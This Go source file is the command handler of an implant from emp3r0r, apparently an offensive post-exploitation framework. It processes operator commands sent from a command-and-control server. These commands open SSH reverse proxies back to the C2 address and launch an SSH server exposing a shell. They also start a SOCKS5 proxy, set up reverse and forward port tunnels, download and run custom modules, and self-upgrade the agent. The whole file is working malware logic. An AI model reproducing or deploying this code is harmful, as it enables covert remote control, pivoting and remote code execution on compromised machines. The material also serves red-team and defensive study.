package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
	"time"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func C2CommandsHandler(cmdSlice []string) (out string) {
	var err error

	switch cmdSlice[0] {

	// stat file
	// !stat '/path/to/a file name.txt'
	case emp3r0r_data.C2CmdStat:
		if len(cmdSlice) < 2 {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}

		path := strings.Join(cmdSlice[1:], " ")
		fi, err := os.Stat(path)
		if err != nil || fi == nil {
			out = fmt.Sprintf("Error: cant stat file %s: %v", path, err)
			return
		}
		fstat := &util.FileStat{}
		fstat.Name = util.FileBaseName(path)
		fstat.Size = fi.Size()
		fstat.Checksum = tun.SHA256SumFile(path)
		fstat.Permission = fi.Mode().String()
		fiData, err := json.Marshal(fstat)
		out = string(fiData)
		if err != nil {
			out = fmt.Sprintf("Error: cant marshal file info %s: %v", path, err)
		}
		return

		// !bring2cc target_agent_ip
	case emp3r0r_data.C2CmdBring2CC:
		// reverse proxy
		if len(cmdSlice) != 2 {
			out = fmt.Sprintf("Error args error: %v", cmdSlice)
			return
		}
		addr := cmdSlice[1]
		out = "Bring2CC: Reverse proxy for " + addr + " finished"

		hasInternet := tun.HasInternetAccess(emp3r0r_data.CCAddress)
		isProxyOK := tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_data.CCAddress)
		if !hasInternet && !isProxyOK {
			out = "Error: We don't have any internet to share"
		}
		for p, cancelfunc := range ReverseConns {
			if addr == p {
				cancelfunc() // cancel existing connection
			}
		}
		addr += ":" + RuntimeConfig.SSHProxyPort
		ctx, cancel := context.WithCancel(context.Background())
		if err = tun.SSHReverseProxyClient(addr, RuntimeConfig.Password,
			&ReverseConns,
			emp3r0r_data.ProxyServer,
			ctx, cancel); err != nil {
			out = err.Error()
		}
		return

	case emp3r0r_data.C2CmdSSHD:
		// sshd server
		// !sshd id shell port args
		log.Printf("Got sshd request: %s", cmdSlice)
		if len(cmdSlice) < 3 {
			out = fmt.Sprintf("Error: args error: %s", cmdSlice)
			log.Print(out)
			return
		}
		shell := cmdSlice[1]
		port := cmdSlice[2]
		args := cmdSlice[3:]
		go func() {
			out = "success"
			err = SSHD(shell, port, args)
			if err != nil {
				out = fmt.Sprintf("Error: %v", err)
			}
		}()
		for !tun.IsPortOpen("127.0.0.1", port) {
			time.Sleep(100 * time.Millisecond)
			if err != nil {
				out = fmt.Sprintf("Error: sshd failed to start: %v\n%s", err, out)
				break
			}
		}
		return

		// proxy server
		// !proxy on 0.0.0.0:12345
	case emp3r0r_data.C2CmdProxy:
		if len(cmdSlice) != 3 {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			log.Print(out)
			return
		}
		log.Printf("Got proxy request: %s", cmdSlice)
		addr := cmdSlice[2]
		err = Socks5Proxy(cmdSlice[1], addr)
		if err != nil {
			out = fmt.Sprintf("Error: Failed to start Socks5Proxy: %v", err)
		}
		out = fmt.Sprintf("Socks5Proxy server ready with username %s and password %s",
			RuntimeConfig.ShadowsocksPort,
			RuntimeConfig.Password)
		return

		// port fwd
		// cmd format: !port_fwd [to/listen] [shID] [operation/protocol] [timeout]
	case emp3r0r_data.C2CmdPortFwd:
		if len(cmdSlice) < 4 {
			out = fmt.Sprintf("Error: Invalid command: %v", cmdSlice)
			return
		}
		out = "success"
		switch cmdSlice[3] {
		case "stop":
			sessionID := cmdSlice[1]
			pf, exist := PortFwds[sessionID]
			if exist {
				pf.Cancel()
				out = fmt.Sprintf("Warning: port mapping %s stopped", pf.Addr)
				break
			}
			out = fmt.Sprintf("Error: port mapping %s not found", pf.Addr)
		case "reverse":
			go func() {
				addr := cmdSlice[1]
				sessionID := cmdSlice[2]
				err = PortFwd(addr, sessionID, "tcp", true, 0)
				if err != nil {
					out = fmt.Sprintf("Error: PortFwd (reverse) failed: %v", err)
				}
			}()
		default:
			go func() {
				to := cmdSlice[1]
				sessionID := cmdSlice[2]
				protocol := cmdSlice[3]
				timeout := 0
				if len(cmdSlice) == 5 {
					timeout, _ = strconv.Atoi(cmdSlice[4])
				}

				err = PortFwd(to, sessionID, protocol, false, timeout)
				if err != nil {
					out = fmt.Sprintf("Error: PortFwd failed: %v", err)
				}
			}()
		}

		return

		// delete_portfwd
		// !delete_portfwd id
	case emp3r0r_data.C2CmdDeletePortFwd:
		if len(cmdSlice) != 2 {
			return
		}
		for id, session := range PortFwds {
			if id == cmdSlice[1] {
				session.Cancel()
			}
		}
		return

		// download utils
	case emp3r0r_data.C2CmdUtils:
		out = VaccineHandler()
		if out != "[+] Utils have been successfully installed" {
			out = fmt.Sprintf("Error: %s", out)
		}

		return

		// download a module and run it
		// !custom_module mod_name checksum
	case emp3r0r_data.C2CmdCustomModule:
		if len(cmdSlice) != 3 {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}
		out = moduleHandler(cmdSlice[1], cmdSlice[2])
		return

		// upgrade
		// !upgrade_agent checksum
	case emp3r0r_data.C2CmdUpdateAgent:
		if len(cmdSlice) != 2 {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}

		checksum := cmdSlice[1]
		out = Upgrade(checksum)
		return

	default:
		// let per-platform C2CommandsHandler do the job
		out = platformC2CommandsHandler(cmdSlice)
	}
	return
}
